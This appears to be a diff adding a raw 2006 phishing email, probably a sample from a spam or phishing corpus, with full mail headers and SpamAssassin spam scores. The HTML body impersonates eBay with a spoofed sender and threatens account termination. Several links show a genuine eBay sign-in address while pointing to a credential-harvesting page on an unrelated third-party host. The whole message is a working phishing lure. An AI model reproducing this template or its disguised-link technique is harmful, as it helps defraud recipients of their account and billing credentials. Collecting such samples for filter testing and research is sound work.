@@ -1,0 +1,166 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <apache@bmesrv.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 904564688C
+ for <user@login.example.com>; Wed,  1 Nov 2006 16:45:46 -0500 (EST)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.example.org (Postfix) with ESMTP id 3A91F131F806
+ for <user@example.com>; Wed,  1 Nov 2006 16:45:46 -0500 (EST)
+X-Spam-Flag: YES
+X-Spam-Score: 7.765
+X-Spam-Level: *******
+X-Spam-Status: Yes, score=7.765 tagged_above=-100 required=4
+ tests=[AWL=-1.316, BAYES_40=-0.185, DCC_CHECK=4,
+ DIGEST_MULTIPLE=0.765, HTML_MESSAGE=0.001, MIME_HTML_ONLY=0.001,
+ RAZOR2_CF_RANGE_51_100=0.5, RAZOR2_CF_RANGE_E8_51_100=1.5,
+ RAZOR2_CHECK=2.5, SPF_HELO_PASS=-0.001]
+Received: from mail.example.org ([127.0.0.1])
+ by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id tf0EuN2g9mfh for <user@example.com>;
+ Wed,  1 Nov 2006 16:45:43 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP
+ for <user@example.com>; Wed,  1 Nov 2006 16:45:43 -0500 (EST)
+Received: from bmesrv.com (bmesrv.com [70.84.220.98])
+ by mail.example.org (Postfix) with ESMTP id 7378E6FA86C
+ for <user@example.com>; Wed,  1 Nov 2006 16:45:43 -0500 (EST)
+Received: by bmesrv.com (Postfix, from userid 48)
+ id 38B53571365; Wed,  1 Nov 2006 16:59:44 -0600 (CST)
+To: user@example.com
+Subject: Update your account
+From: eBay <aw-confirm@ebay.com>
+Reply-To: aw-confirm@ebay.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <20061101225944.38B53571365@bmesrv.com>
+Date: Wed,  1 Nov 2006 16:59:44 -0600 (CST)
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 431
+
+
+<html> <head> <title>Update your account</title> <xmeta
+http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> </head>
+<xbody bgcolor="#FFFFFF"> <br> <table width="600" border="0"
+cellspacing="0" cellpadding="0">
+  <tr height=0>
+    <td width=0></td>
+    <td width=300></td>
+    <td width=300></td>
+  </tr>
+  <tr>
+    <td width=0></td>
+    <td valign="Top" colspan="2" width="600" col=1>
+      <TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+        <TR>
+          <TD colSpan=7><a target="_blank"    
+HREF="http://www.multistructure.co.id/manual/.sql/update.php" ><IMG height=101
+src="http://emailpics.ebay.com/459718669/images/SS35_Q103_logo_ss35_122602-1.gif"   
+width=131 border=0></A><IMG height=101
+src="http://emailpics.ebay.com/459718669/images/SS35_Q103_headline_ss35_122602-1.gif"   
+width=469></TD>
+        </TR>
+        <TR>
+          <TD> </TD>
+          <TD vAlign=center align=left colSpan=5> </TD>
+          <TD> </TD>
+        </TR>
+        <tr>
+          <td>
+            <center>
+              <FONT face=Arial,Helvetica,sans-serif size=2> <br>
+              It has come to our attention that your eBay billing updates
+are out of order. If you could please take 1-2 minutes out of your online
+experience and update your billing records you will not run into any
+future problems with the online service. However, failure to update your
+records will result in account termination. Please update your records.  
+<br>
+              <br>
+              <br>
+              Once you have updated your account records your eBay session
+will not be interrupted and will continue as normal. Failure to update
+will result in cancellation of service, Terms of Service (TOS) violations
+or future billing problems. <br>
+              <br>
+              To update your eBay records now click here: <br>
+              <A target="_blank"    
+HREF="http://www.multistructure.co.id/manual/.sql/update.php"   
+>https://signin.ebay.com/ws/eBayISAPI.dll?PowerSellerSignin</A> <br>
+              <br>
+              <br>
+              </font>
+            </center>
+          </td>
+        </tr>
+        <TR>
+          <TD vAlign=top align=left colSpan=7>
+            <TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+              <TBODY>
+                <TR>
+                  <TD align=right> </TD>
+                </TR>
+              </TBODY>
+            </TABLE>
+          </TD>
+        </TR>
+        <TR>
+          <TD colSpan=7>
+            <TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+              <TBODY>
+                <TR>
+                  <TD><IMG height=34
+src="http://emailpics.ebay.com/459718669/images/searchMargin_ss35_122602-1.gif"   
+width=26></TD>
+                  <TD width=285
+background="http://emailpics.ebay.com/459718669/images/searchBG_ss35_122602-1.gif"   
+bgColor="#ffffff" height=34> <FONT face="arial narrow" size=2>
+</FONT></TD>
+                  <TD><a target="_blank"    
+HREF="http://www.multistructure.co.id/manual/.sql/update.php"   
+><IMG height=34
+src="http://emailpics.ebay.com/459718669/images/goToeBay_ss35_122602-1.gif"   
+width=289 border=0></A></TD>
+                </TR>
+              </TBODY>
+            </TABLE>
+          </TD>
+        </TR>
+      </TABLE>
+    </td>
+  </tr>
+  <tr>
+    <td width=0></td>
+    <td valign="Top" colspan="2" width="600" col=1>
+      <CENTER>
+        <FONT face=Arial,Helvetica,sans-serif color="#666666" size=1>eBay
+sent this e-mail to you because your Notification Preferences <BR>
+        indicate that you want to receive information about your eBay Credit
+Card Statement.<BR>
+        <BR>
+        To change your communication preferences, <a target="_blank"    
+HREF="https://signin.ebay.com/ws/eBayISAPI.dll?PowerSellerSignin"   
+>click here</A>. Or, simply reply to this e-mail <BR>
+        with UNSUBSCRIBE in the subject line. Please note that it may take
+up to 14 days <BR>
+        to process your request. Visit our <a target="_blank"    
+HREF="http://pages.ebay.com/help/community/png-priv.html" >Privacy
+Policy</A> and <a target="_blank"    
+HREF="http://pages.ebay.com/help/community/png-user.html" >User
+Agreement</A> if you have any questions. <BR>
+        <BR>
+        Copyright © 2006 eBay Inc. All Rights Reserved. <BR>
+        Designated trademarks and brands are the property of their
+respective owners. <BR>
+        eBay and the eBay logo are trademarks of eBay Inc.</FONT>
+      </CENTER>
+    </td>
+  </tr> </table> </xbody> </html>
+
+
+
+
+
